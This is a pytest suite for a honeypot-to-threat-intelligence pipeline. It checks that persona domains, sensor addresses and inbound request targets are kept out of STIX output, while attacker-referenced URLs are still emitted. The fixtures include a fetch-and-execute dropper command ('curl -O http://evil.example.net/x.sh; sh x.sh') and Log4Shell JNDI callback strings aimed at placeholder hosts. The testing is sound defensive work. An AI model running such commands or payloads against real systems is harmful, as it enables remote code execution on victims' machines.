"""Persona domains are our own surface; inbound request targets are not IoCs.

Measured on the v2 corpus 2026-09-28: 158,128 of 178,022 Url observables
(88.8%) named a persona domain the sensors answer to — minted from the
INBOUND Host header (h0neytr4p 97%, Suricata the rest) — and each one was
then looked up at GTI and annotated with a GTI Note.

Two independent defences, both tested here:

  1. Provenance. The request an attacker sends TO a sensor (Host + path,
     SNI) is request metadata (`session.request_urls` / `request_hosts`),
     never `session.urls` / `domains`, and is not emitted unless the legacy
     switch TPOT2CTI_INBOUND_REQUEST_OBSERVABLES is on. What the attacker
     REFERENCES — a dropper in a command, a download source, a Log4Shell
     callback — is still emitted.
  2. Refusal. build_url and build_domain refuse any value whose host is a
     persona domain root or subdomain (TPOT2CTI_OWN_DOMAINS), a sensor
     address or a sensor hostname — whichever path it arrived by.

The real persona roots are deliberately NOT in this public repository; these
tests use placeholder roots under example.com / example.net / example.org.
"""
from __future__ import annotations

import json
from datetime import datetime, timezone

import pytest

from tpot2cti import own_surface as OS
from tpot2cti.own_surface import OwnSurface, canon_host
from tpot2cti.parsers.base import AttackSession, ParsedEvent
from tpot2cti.redact import SensorRedactor
from tpot2cti.stix.builder import STIXBuilder
from tpot2cti.stix_ids import generate_url_id

from tests.conftest import legacy_inbound_cfg

ROOT_A = "persona-a.example.com"
ROOT_B = "persona-b.example.net"
ROOT_IDN = "bücher-persona.example.org"          # configured in Unicode
ROOTS = [ROOT_A, ROOT_B, ROOT_IDN]
SENSOR_IP = "192.0.2.18"
SENSOR_HOST = "sensor-a"

#: Hosts that must be REFUSED: the root, subdomains, and every spelling the
#: canonicaliser must fold (case, trailing dot, port, IDNA both ways).
OWN_HOSTS = [
    ROOT_A,
    f"db1.{ROOT_A}",
    f"a.b.c.{ROOT_A}",
    "DB1.Persona-A.Example.COM",
    f"db1.{ROOT_A}.",
    f"db1.{ROOT_A}:8443",
    f"hmi.{ROOT_B}",
    "Bücher-Persona.example.org",
    "www." + "bücher-persona".encode("idna").decode() + ".example.org",  # punycode
]

#: Look-alikes that must NOT be refused: someone else's infrastructure.
LOOKALIKE_HOSTS = [
    "persona-a-evil.example.com",                  # hyphenated brand
    "evilpersona-a.example.com",                   # prefix glued on
    f"{ROOT_A}.evil.example.net",                  # root as a left label
    "example.com",                                 # parent zone
    "persona.example.com",                         # sibling sharing labels
    "a.example.com",
    "persоna-a.example.com",                       # Cyrillic 'о' look-alike
    "persona-b.example.org",                       # same label, other TLD
    "bucher-persona.example.org",                  # de-accented look-alike
]


def _own(redactor=None):
    return OwnSurface(ROOTS, redactor=redactor)


def _redactor():
    return SensorRedactor([SENSOR_HOST], [SENSOR_IP, "10.0.0.0/8"], secret="t")


@pytest.fixture()
def b(cfg):
    bl = STIXBuilder(cfg)
    bl._redactor = _redactor()
    bl._own_surface = _own()
    return bl


@pytest.fixture()
def legacy(cfg):
    bl = STIXBuilder(legacy_inbound_cfg(cfg))
    bl._redactor = _redactor()
    bl._own_surface = _own()
    return bl


# ---------------------------------------------------------------------------
# 1. The predicate
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("raw,want", [
    ("DB1.Example.COM.", "db1.example.com"),
    ("db1.example.com:8443", "db1.example.com"),
    ("[2001:db8::1]:443", "2001:db8::1"),
    ("2001:db8::1", "2001:db8::1"),
    ("192.0.2.1:80", "192.0.2.1"),
    ("Bücher.example", "xn--bcher-kva.example"),
    ("  ", ""),
    (None, ""),
])
def test_canon_host(raw, want):
    assert canon_host(raw) == want


@pytest.mark.parametrize("host", OWN_HOSTS)
def test_root_and_subdomains_are_own(host):
    assert _own().host_reason(host) == OS.REASON_PERSONA_DOMAIN, host


@pytest.mark.parametrize("host", LOOKALIKE_HOSTS)
def test_lookalikes_are_not_own(host):
    assert _own().host_reason(host) is None, f"refused a look-alike: {host}"


def test_url_level_uses_the_host_only():
    own = _own()
    assert own.url_reason(f"https://db1.{ROOT_A}:8443/wp-login.php?x=1")
    assert own.url_reason(f"http://user:pw@{ROOT_A}/")
    # The root appearing in the PATH or QUERY is not the host.
    assert own.url_reason(f"http://evil.example.net/{ROOT_A}/x") is None
    assert own.url_reason(f"http://evil.example.net/?h={ROOT_A}") is None
    assert own.url_reason("/bare/path") is None
    assert own.url_reason("") is None


def test_sensor_addresses_and_hostnames_come_from_the_redactor():
    own = _own(redactor=_redactor())
    assert own.url_reason(f"http://{SENSOR_IP}/x") == OS.REASON_SENSOR_ADDRESS
    assert own.url_reason("http://10.4.5.6:8080/x") == OS.REASON_SENSOR_ADDRESS
    assert own.host_reason(SENSOR_HOST.upper()) == OS.REASON_SENSOR_HOSTNAME
    assert own.url_reason("http://192.0.2.99/x") is None


def test_invalid_entries_are_ignored_and_counted():
    own = OwnSurface([ROOT_A, "com", "local", "192.0.2.1", " ", "*.x.example.net"])
    assert own.roots == frozenset({ROOT_A, "x.example.net"})
    assert own.summary() == {"domains_configured": 2, "invalid_entries": 3}
    assert own.host_reason("com") is None


def test_from_env_reads_one_variable_and_never_exposes_the_roots():
    own = OS.from_env({OS.ENV_OWN_DOMAINS: f" {ROOT_A} , {ROOT_B},"}, redactor=False)
    assert own.roots == frozenset({ROOT_A, ROOT_B})
    assert ROOT_A not in json.dumps(own.summary())
    assert OS.from_env({}, redactor=False).roots == frozenset()


# ---------------------------------------------------------------------------
# 2. Refusal in the builder (defence in depth, every producer)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("host", [h for h in OWN_HOSTS if h.isascii()])
def test_build_url_refuses_persona_urls(b, host):
    assert b.build_url(f"https://{host}/wp-login.php") is None
    assert b.own_surface_refused == {"url:persona-domain": 1}
    assert b.rejected_own_surface_urls == 1


def test_a_unicode_host_url_is_refused_before_the_guard(b):
    """valid_url refuses a raw Unicode host outright (OpenCTI wants the
    A-label), so the own-surface counter must not claim it."""
    assert b.build_url("https://Bücher-Persona.example.org/x") is None
    assert b.own_surface_refused == {}


@pytest.mark.parametrize("host", LOOKALIKE_HOSTS[:-3] + ["persona-b.example.org"])
def test_build_url_keeps_lookalikes(b, host):
    assert b.build_url(f"http://{host}/x.sh") is not None, host
    assert b.own_surface_refused == {}


def test_build_url_refusal_reasons_are_distinct(b):
    b.build_url(f"http://db1.{ROOT_A}/x")
    b.build_url(f"http://{SENSOR_IP}/x")
    b.build_url(f"http://{SENSOR_HOST}.example.com/x")   # not the bare name
    b.build_url(f"http://{SENSOR_IP}:8080/y")
    assert b.own_surface_refused == {"url:persona-domain": 1,
                                     "url:sensor-address": 2}


def test_build_domain_refuses_persona_domains_and_keeps_lookalikes(b):
    assert b.build_domain(f"db1.{ROOT_A}") is None
    assert b.build_domain(ROOT_B.upper() + ".") is None
    assert b.build_domain("persona-a-evil.example.com") is not None
    assert b.build_domain("persona.example.org") is not None
    assert b.own_surface_refused == {"domain:persona-domain": 2}
    assert b.rejected_domains == 2


def test_no_roots_configured_changes_nothing(cfg):
    bl = STIXBuilder(cfg)
    bl._own_surface = OwnSurface([])
    bl._redactor = None
    assert bl.build_url(f"https://db1.{ROOT_A}/x") is not None
    assert bl.build_domain(f"db1.{ROOT_A}") is not None


# ---------------------------------------------------------------------------
# 3. Provenance: inbound request targets vs attacker-referenced URLs
# ---------------------------------------------------------------------------

def _web_session(etype="H0neytr4p", ip="203.0.113.50", request_urls=(),
                 request_hosts=(), urls=(), domains=()):
    ev = ParsedEvent(src_ip=ip, timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                     sensor_hostname="s1", event_type=etype, dst_port=443,
                     src_country_code="DE", src_asn=64512)
    s = AttackSession.from_event(ev)
    s.request_urls = list(request_urls)
    s.request_hosts = list(request_hosts)
    s.urls = list(urls)
    s.domains = list(domains)
    return s


def _urls(objs):
    return {o["value"] for o in objs if o["type"] == "url"}


def _dangling(objs):
    ids = {o["id"] for o in objs}
    missing = []
    for o in objs:
        for k in ("source_ref", "target_ref", "sighting_of_ref"):
            if o.get(k) and o[k] not in ids and o[k].split("--")[0] in (
                    "url", "domain-name"):
                missing.append((o["id"], k, o[k]))
        for r in o.get("object_refs") or []:
            if r not in ids and r.split("--")[0] in ("url", "domain-name"):
                missing.append((o["id"], "object_refs", r))
    return missing


def test_h0neytr4p_parser_splits_request_from_reference():
    """Host + URI is request metadata; a JNDI callback is a reference."""
    from tpot2cti.parsers.h0neytr4p import H0neytr4pParser
    ev = ParsedEvent(src_ip="203.0.113.50", timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                     sensor_hostname="s1", event_type="H0neytr4p", dst_port=443)
    ev.meta = {"host_header": f"db1.{ROOT_A}", "uri": "/login",
               "jndi_payloads": [{"url": "ldap://c2.example.net/a", "host": "c2.example.net"}]}
    s = AttackSession.from_event(ev)
    H0neytr4pParser._aggregate_session(s, [ev])
    assert s.request_urls == [f"https://db1.{ROOT_A}/login"]
    assert s.request_hosts == [f"db1.{ROOT_A}"]
    assert s.urls == ["ldap://c2.example.net/a"]
    assert s.domains == ["c2.example.net"]


def test_web_session_emits_no_inbound_request_url_by_default(b):
    s = _web_session(request_urls=[f"https://db1.{ROOT_A}/login",
                                   "https://unrelated.example.net/x",
                                   "/bare"],
                     urls=["ldap://c2.example.net/a"])
    objs = b.build_h0neytr4p_session(s)
    assert _urls(objs) == {"ldap://c2.example.net/a"}, "only the reference survives"
    assert b.inbound_request_suppressed == {"url": 3}
    # Suppressed, not refused: the persona URL never reached build_url.
    assert b.own_surface_refused == {}
    assert _dangling(objs) == []


def test_legacy_switch_restores_emission_but_not_own_surface(legacy):
    s = _web_session(request_urls=[f"https://db1.{ROOT_A}/login",
                                   "https://unrelated.example.net/x"])
    objs = legacy.build_h0neytr4p_session(s)
    assert _urls(objs) == {"https://unrelated.example.net/x"}
    assert legacy.own_surface_refused == {"url:persona-domain": 1}
    assert legacy.inbound_request_suppressed == {}
    assert _dangling(objs) == []


@pytest.mark.parametrize("method,etype", [
    ("build_tanner_session", "Tanner"),
    ("build_elasticpot_session", "ElasticPot"),
    ("build_nginx_session", "NGINX"),
    ("build_wordpot_session", "Wordpot"),
    ("build_honeyaml_session", "Honeyaml"),
    ("build_galah_session", "Galah"),
])
def test_every_web_builder_suppresses_request_urls(b, method, etype):
    s = _web_session(etype=etype, request_urls=["http://proxy-judge.example.net/"])
    objs = getattr(b, method)(s)
    assert _urls(objs) == set()
    assert b.inbound_request_suppressed == {"url": 1}


@pytest.mark.parametrize("parser_mod,cls,meta_key", [
    ("tanner", "TannerParser", "url"),
    ("wordpot", "WordpotParser", "request_path"),
    ("nginx", "NginxParser", "request_uri"),
    ("honeyaml", "HoneyamlParser", "request_path"),
    ("elasticpot", "ElasticPotParser", "request_url"),
])
def test_web_parsers_put_request_targets_in_request_urls(parser_mod, cls, meta_key):
    import importlib
    mod = importlib.import_module(f"tpot2cti.parsers.{parser_mod}")
    parser = getattr(mod, cls)()
    ev = ParsedEvent(src_ip="203.0.113.50", timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                     sensor_hostname="s1", event_type=parser.type_name, dst_port=80)
    ev.meta = {meta_key: f"http://db1.{ROOT_A}/x"}
    (s,) = parser.correlate([ev])
    assert s.request_urls == [f"http://db1.{ROOT_A}/x"]
    assert s.urls == []


def test_command_and_download_urls_are_kept(b):
    """Positive control: the actual product. A dropper URL in a command or a
    download source is emitted; one naming our own surface is refused."""
    ev = ParsedEvent(src_ip="203.0.113.51", timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                     sensor_hostname="s1", event_type="Beelzebub", dst_port=22,
                     src_country_code="DE", src_asn=64512)
    s = AttackSession.from_event(ev)
    s.commands = ["cd /tmp; curl -O http://evil.example.net/x.sh; sh x.sh",
                  f"wget http://db1.{ROOT_A}/probe"]
    objs = b.build_beelzebub_session(s)
    assert _urls(objs) == {"http://evil.example.net/x.sh"}
    assert b.own_surface_refused == {"url:persona-domain": 1}
    assert _dangling(objs) == []

    ev2 = ParsedEvent(src_ip="203.0.113.52", timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                      sensor_hostname="s1", event_type="Dionaea", dst_port=445,
                      src_country_code="DE", src_asn=64512)
    s2 = AttackSession.from_event(ev2)
    s2.urls = ["http://dl.example.net/mal.exe"]
    s2.malware_hashes = ["a" * 64]
    s2.downloads = [{"sha256": "a" * 64, "url": "http://dl.example.net/mal.exe"}]
    assert "http://dl.example.net/mal.exe" in _urls(b.build_dionaea_session(s2))


def _suricata(**meta):
    ev = ParsedEvent(src_ip="203.0.113.60", timestamp=datetime(2026, 9, 28, tzinfo=timezone.utc),
                     sensor_hostname="s1", event_type="Suricata", dst_port=443,
                     dst_ip=SENSOR_IP)
    ev.meta = dict(meta)
    return AttackSession.from_event(ev)


def test_suricata_inbound_host_sni_and_url_are_not_emitted(b):
    s = _suricata(tls_sni=f"db1.{ROOT_A}", http_host="judge.example.net",
                  http_url="/index.php")
    objs = b.build_suricata_alert(s)
    kinds = {o["type"] for o in objs}
    assert "url" not in kinds and "domain-name" not in kinds
    assert not any(o.get("relationship_type") == "resolves-to" for o in objs), (
        "a resolves-to edge would assert '<name> resolves to OUR sensor'")
    assert b.inbound_request_suppressed == {"domain": 2, "url": 1}


def test_suricata_legacy_switch_still_refuses_own_names(legacy):
    s = _suricata(tls_sni=f"db1.{ROOT_A}", http_host="judge.example.net",
                  http_url="/index.php")
    objs = legacy.build_suricata_alert(s)
    doms = {o["value"] for o in objs if o["type"] == "domain-name"}
    assert doms == {"judge.example.net"}
    assert legacy.own_surface_refused == {"domain:persona-domain": 1}


def test_jndi_salvage_skips_an_own_host_group_without_dangling(b):
    from tests.test_h0neytr4p_spoofed_src_ip import _legacy_doc, _obfuscate
    from tpot2cti.parsers.h0neytr4p import H0neytr4pParser
    parser = H0neytr4pParser()
    own_ev = parser.parse(_legacy_doc(src_ip=_obfuscate(f"jndi:ldap://db1.{ROOT_A}/Exploit")))
    ext_ev = parser.parse(_legacy_doc(src_ip=_obfuscate("jndi:ldap://c2.example.net/Exploit")))
    assert own_ev.meta.get("jndi_payloads") and ext_ev.meta.get("jndi_payloads")

    objs = b.build_unattributed_payload_objects([own_ev, ext_ev])
    assert _urls(objs) == {"ldap://c2.example.net/Exploit"}
    own_id = generate_url_id(f"ldap://db1.{ROOT_A}/Exploit")
    assert not any(own_id in json.dumps(o) for o in objs), "an own-host anchor leaked"
    assert b.own_surface_refused == {"url:persona-domain": 1}
    assert _dangling(objs) == []
    # The external group keeps its whole graph.
    assert sum(1 for o in objs if o["type"] == "sighting") == 1
    assert sum(1 for o in objs if o["type"] == "note") == 1


# ---------------------------------------------------------------------------
# 4. Attacker-profile Notes: samples written before the change
# ---------------------------------------------------------------------------

def test_profile_note_filters_own_surface_samples():
    from tpot2cti.stix.rendering import render_attacker_profile_body
    OS.set_default(OwnSurface(ROOTS, redactor=_redactor()))
    try:
        rows = [{
            "parser": "H0neytr4p", "first_seen": "2026-09-01T00:00:00+00:00",
            "last_seen": "2026-09-02T00:00:00+00:00", "session_count": 1,
            "event_count": 1,
            "sample_urls_json": [f"https://db1.{ROOT_A}/login",
                                 f"http://{SENSOR_IP}/x",
                                 "http://evil.example.net/x.sh"],
            "sample_domains_json": [f"hmi.{ROOT_B}", "c2.example.net"],
        }]
        body = render_attacker_profile_body("203.0.113.70", rows)
    finally:
        OS.set_default(None)
    assert "evil.example.net/x.sh" in body and "c2.example.net" in body
    assert ROOT_A not in body and ROOT_B not in body and SENSOR_IP not in body


# ---------------------------------------------------------------------------
# 5. Config switch, counters, /health
# ---------------------------------------------------------------------------

def test_the_legacy_switch_is_strict(monkeypatch):
    from tests import dr02_harness as H
    from tpot2cti.config import ConfigError
    assert H.make_cfg({H.LEGACY_INBOUND: "false"}).cycle.inbound_request_observables is False
    assert H.make_cfg({H.LEGACY_INBOUND: "true"}).cycle.inbound_request_observables is True
    with pytest.raises(ConfigError):
        H.make_cfg({H.LEGACY_INBOUND: "ture"})


def test_merge_totals_resets_on_configuration_change():
    c1 = {"domains_configured": 3, "inbound_request_observables": False,
          "refused": {"url:persona-domain": 2}, "refused_total": 2,
          "inbound_suppressed": {"url": 5}, "inbound_suppressed_total": 5}
    t = OS.merge_totals(None, c1, now_iso="T1")
    t = OS.merge_totals(t, c1, now_iso="T2")
    assert t["since"] == "T1" and t["cycles"] == 2
    assert t["refused"] == {"url:persona-domain": 4}
    assert t["inbound_suppressed_total"] == 10
    t = OS.merge_totals(t, dict(c1, domains_configured=4), now_iso="T3")
    assert t["since"] == "T3" and t["cycles"] == 1


def test_default_cycle_differs_from_legacy_only_by_inbound_targets(tmp_path, monkeypatch):
    """The whole-cycle proof. The legacy bundle is byte-identical to the
    pre-change golden (tests/test_evidence_gate.py); the default bundle must
    be exactly that minus the inbound request URL observables and their
    edges, with the only other change being the indicator prose that used to
    count a request path as a 'referenced URL'."""
    from tests import dr02_harness as H
    monkeypatch.delenv(OS.ENV_OWN_DOMAINS, raising=False)
    legacy_objs, _, _, _ = H.cycle_bundle(tmp_path / "l")
    assert H.digest(legacy_objs) == H.golden()["cycle"]
    new_objs, summary, _, state = H.cycle_bundle(tmp_path / "n", {H.LEGACY_INBOUND: "false"})

    L = {o["id"]: o for o in legacy_objs}
    N = {o["id"]: o for o in new_objs}
    assert set(N) <= set(L), "the change must only remove objects"
    removed = [L[i] for i in set(L) - set(N)]
    assert removed, "non-vacuity: the fixtures carry at least one inbound URL"
    removed_urls = {o["id"] for o in removed if o["type"] == "url"}
    for o in removed:
        assert o["type"] in ("url", "relationship"), o["type"]
        if o["type"] == "relationship":
            assert {o["source_ref"], o["target_ref"]} & removed_urls
    for i in set(L) & set(N):
        if L[i] != N[i]:
            assert L[i]["type"] == "ipv4-addr", L[i]["type"]
            a = dict(L[i]); bb = dict(N[i])
            da, db = a.pop("x_opencti_description"), bb.pop("x_opencti_description")
            assert a == bb and "URL(s)" in da and "URL(s)" not in db

    own = summary["own_surface"]
    assert own["inbound_request_observables"] is False
    assert own["inbound_suppressed"]["url"] >= len(removed_urls)
    assert json.loads(state.get("last_cycle_own_surface")) == own
    totals = json.loads(state.get("own_surface_totals"))
    assert totals["cycles"] == 1 and totals["since"] == H.FIXED_ISO

    from tpot2cti.health import HealthStatus
    payload, _ = HealthStatus(state, pycti_version="test").compute_status()
    assert payload["own_surface"]["last_cycle"] == own
    assert payload["own_surface"]["totals"]["inbound_suppressed_total"] == \
        own["inbound_suppressed_total"]


def test_persona_roots_in_the_environment_reach_the_cycle(tmp_path, monkeypatch):
    """TPOT2CTI_OWN_DOMAINS is read by the builder the cycle constructs, and
    its refusals reach the summary. The fixtures' web requests are to
    documentation addresses, so a root covering none of them refuses
    nothing — the count is what proves the wiring."""
    from tests import dr02_harness as H
    monkeypatch.setenv(OS.ENV_OWN_DOMAINS, f"{ROOT_A},{ROOT_B}")
    _, summary, _, _ = H.cycle_bundle(tmp_path, {H.LEGACY_INBOUND: "false"})
    assert summary["own_surface"]["domains_configured"] == 2
    assert ROOT_A not in json.dumps(summary["own_surface"])
